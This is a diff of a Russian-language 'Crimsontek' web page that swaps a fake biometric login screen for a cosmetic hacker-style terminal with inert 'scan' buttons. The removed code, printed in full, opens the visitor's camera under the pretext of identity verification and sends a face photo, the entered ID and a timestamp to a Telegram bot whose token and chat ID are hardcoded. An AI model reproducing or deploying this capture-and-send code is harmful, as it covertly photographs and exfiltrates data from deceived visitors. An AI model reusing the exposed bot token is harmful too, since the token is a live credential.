@@ -1,155 +1,145 @@
-<!DOCTYPE html>
+\<!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Вход в систему • Crimsontek</title>
-  <link rel="stylesheet" href="styles.css">
+  <title>CRIMSONTEK // CORE TERMINAL</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
+    :root {
+      --main-red: #ff0000;
+      --bg-black: #050505;
+      --text-gray: #b0b0b0;
+      --neon-green: #00ff00;
+    }
+
+    body {
+      background-color: var(--bg-black);
+      color: var(--text-gray);
+      font-family: 'JetBrains Mono', monospace;
+      margin: 0; padding: 10px;
+      overflow-x: hidden;
+      display: flex; flex-direction: column;
+      height: 100vh; box-sizing: border-box;
+    }
+
+    .scanline {
+      width: 100%; height: 2px;
+      background: rgba(255, 0, 0, 0.1);
+      position: fixed; top: 0; z-index: 1000;
+      animation: scan 4s linear infinite;
+      pointer-events: none;
+    }
+    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+    header {
+      border-bottom: 2px solid var(--main-red);
+      padding-bottom: 5px; margin-bottom: 15px;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    
+    .logo { color: var(--main-red); font-size: 1.4rem; font-weight: 900; text-shadow: 0 0 10px rgba(255,0,0,0.5); }
+
     .card {
-      background: #1a1a1a;
-      border: 3px solid #ff0000;
-      border-radius: 8px;
-      padding: 35px 25px;
-      max-width: 540px;
-      margin: 40px auto;
+      background: rgba(15, 0, 0, 0.8);
+      border: 1px solid #300;
+      padding: 10px; margin-bottom: 10px;
+      position: relative;
     }
-    input {
-      width: 100%;
-      padding: 18px;
-      margin: 20px 0;
-      background: #111;
-      border: 2px solid #ff0000;
-      color: white;
-      font-size: 1.15rem;
-      text-align: center;
-      box-sizing: border-box; /* Чтобы поле не вылезало за края на телефоне */
+
+    .card-header {
+      color: var(--main-red); font-size: 0.75rem; font-weight: bold;
+      border-bottom: 1px dashed #400; padding-bottom: 5px; margin-bottom: 8px;
     }
-    button {
-      width: 100%;
-      padding: 18px;
-      margin: 12px 0;
-      font-size: 1.15rem;
-      font-weight: bold;
-      text-transform: uppercase;
-      background: #ff0000;
-      color: white;
-      border: none;
-      cursor: pointer;
+
+    /* Консоль */
+    .terminal-box {
+      background: #000; height: 160px;
+      overflow-y: auto; font-size: 0.75rem;
+      padding: 8px; border: 1px solid #222;
     }
-    button:hover {
-      background: #ff3333;
+    .t-gray { color: #666; }
+    .t-red { color: var(--main-red); }
+    .t-green { color: var(--neon-green); }
+    .t-orange { color: #ffae00; }
+
+    /* Модули */
+    .modules-list { display: flex; flex-direction: column; gap: 8px; }
+    .module-btn {
+      background: transparent; border: 1px solid #333;
+      color: #fff; padding: 14px; font-family: inherit;
+      font-size: 0.9rem; text-align: left; cursor: pointer;
+      display: flex; justify-content: space-between; opacity: 0.5;
+      pointer-events: none; transition: 0.3s;
     }
-    #video {
-      width: 100%;
-      border: 3px solid #ff0000;
-      border-radius: 6px;
-      margin: 20px 0;
-      background: #000;
-    }
+    .module-btn.active { opacity: 1; pointer-events: auto; border-color: var(--main-red); }
+    .module-btn:active { background: var(--main-red); color: #000; }
   </style>
 </head>
 <body>
+  <div class="scanline"></div>
+
   <header>
-    <div class="logo" style="font-size:2.8rem; color:#ff0000; text-align:center; font-weight:900;">CRIMSONTEK</div>
+    <div class="logo">CRIMSONTEK</div>
+    <div style="font-size: 0.7rem; text-align: right;">NODE: RED_MAGIC_10<br>OS: v0.8.4</div>
   </header>
 
   <div class="card">
-    <h2 style="color:#ff0000; text-align:center; margin-bottom:25px;">ДОСТУП К СИСТЕМЕ</h2>
-    
-    <input type="text" id="username" placeholder="ВВЕДИТЕ ИДЕНТИФИКАТОР" maxlength="30">
+    <div class="card-header">SYSTEM_BOOT_LOG</div>
+    <div class="terminal-box" id="console"></div>
+  </div>
 
-    <button onclick="startVerification()">ПОДКЛЮЧИТЬ НЕЙРОСКАНЕР</button>
-
-    <div id="camera-container" style="display:none;">
-      <p style="color:#ff0000; text-align:center; margin:20px 0;">СИСТЕМА ТРЕБУЕТ БИОМЕТРИЧЕСКОЕ ПОДТВЕРЖДЕНИЕ</p>
-      <video id="video" autoplay playsinline muted></video>
-      <button onclick="takePhoto()">СКАНИРОВАТЬ ЛИЦО</button>
-      <button onclick="cancelVerification()" style="background:#444;">ОТМЕНИТЬ</button>
+  <div class="card">
+    <div class="card-header">AVAILABLE_MODULES</div>
+    <div class="modules-list">
+      <button class="module-btn" id="btn-1" onclick="exec('phone_scan.py')"><span>> phone_scan.py</span><span>[LOCKED]</span></button>
+      <button class="module-btn" id="btn-2" onclick="exec('ip_scan.py')"><span>> ip_scan.py</span><span>[LOCKED]</span></button>
+      <button class="module-btn" id="btn-3" onclick="exec('mail_scan.py')"><span>> mail_scan.py</span><span>[LOCKED]</span></button>
     </div>
-
-    <div id="status" style="text-align:center; margin-top:20px; font-weight:bold; font-size:1.2rem;"></div>
   </div>
 
   <script>
-    const BOT_TOKEN = "8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0";
-    const CHAT_ID = "7616949660";
-    let stream = null;
+    const logs = [
+      { t: "[SYSTEM] Инициализация ядра Crimsontek...", c: "t-gray" },
+      { t: "[BOOT] Загрузка биометрического модуля...", c: "t-gray" },
+      { t: "[STATUS] Доступ к модулям Network Scan и OSINT открыт", c: "t-green" },
+      { t: "[WARNING] Уровень угрозы: MEDIUM", c: "t-orange" },
+      { t: "[OK] Подключение к CrimsonNet установлено", c: "t-green" },
+      { t: "[BIO] Биометрический сканер активирован", c: "t-red" },
+      { t: "[SYSTEM] Ожидание команды оператора...", c: "t-white" }
+    ];
 
-    function showStatus(text, color = "#fff") {
-      document.getElementById("status").innerHTML = `<span style="color:${color}">${text}</span>`;
-    }
+    const consoleBox = document.getElementById('console');
+    let index = 0;
 
-    async function startVerification() {
-      const username = document.getElementById("username").value.trim();
-      if (!username) {
-        showStatus("Введите идентификатор!", "orange");
-        return;
-      }
-
-      document.getElementById("camera-container").style.display = "block";
-      showStatus("Запуск камеры...", "#ccc");
-
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        document.getElementById("video").srcObject = stream;
-        showStatus("Камера запущена.<br>Нажмите «СКАНИРОВАТЬ ЛИЦО»", "lime");
-      } catch (err) {
-        showStatus("Не удалось получить доступ к камере.<br>Разрешите камеру в настройках браузера", "red");
-      }
-    }
-
-    async function takePhoto() {
-      const username = document.getElementById("username").value.trim();
-      const video = document.getElementById("video");
-
-      if (!video.srcObject) {
-        showStatus("Камера не запущена", "red");
-        return;
-      }
-
-      showStatus("Отправка фото...", "orange");
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      const blob = await fetch(canvas.toDataURL("image/jpeg", 0.75)).then(r => r.blob());
-
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("caption", `🛡️ Новый вход\nID: ${username}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
-      formData.append("photo", blob, "face.jpg");
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData
+    function printLogs() {
+      if (index < logs.length) {
+        const p = document.createElement('p');
+        p.className = logs[index].c;
+        p.innerHTML = logs[index].t;
+        consoleBox.appendChild(p);
+        consoleBox.scrollTop = consoleBox.scrollHeight;
+        index++;
+        setTimeout(printLogs, 600);
+      } else {
+        // Активируем кнопки после завершения логов
+        document.querySelectorAll('.module-btn').forEach(btn => {
+          btn.classList.add('active');
+          btn.lastChild.innerText = "[READY]";
         });
-
-        if (res.ok) {
-          // Выводим зеленую надпись успеха
-          showStatus(`ДОСТУП РАЗРЕШЁН<br>ДОБРО ПОЖАЛОВАТЬ, ${username.toUpperCase()}`, "lime");
-          
-          // Через 2 секунды кидаем пользователя в терминал управления
-          setTimeout(() => {
-            window.location.href = "dashboard.html";
-          }, 2000);
-          
-        } else {
-          showStatus("Ошибка отправки в Telegram", "red");
-        }
-      } catch (e) {
-        showStatus("Ошибка соединения", "red");
       }
     }
 
-    function cancelVerification() {
-      if (stream) stream.getTracks().forEach(track => track.stop());
-      document.getElementById("camera-container").style.display = "none";
-      showStatus("");
+    function exec(cmd) {
+      const p = document.createElement('p');
+      p.className = "t-red";
+      p.innerHTML = `> RUNNING: ${cmd}... ACCESSING DATA`;
+      consoleBox.appendChild(p);
+      consoleBox.scrollTop = consoleBox.scrollHeight;
     }
+
+    window.onload = printLogs;
   </script>
 </body>
 </html>
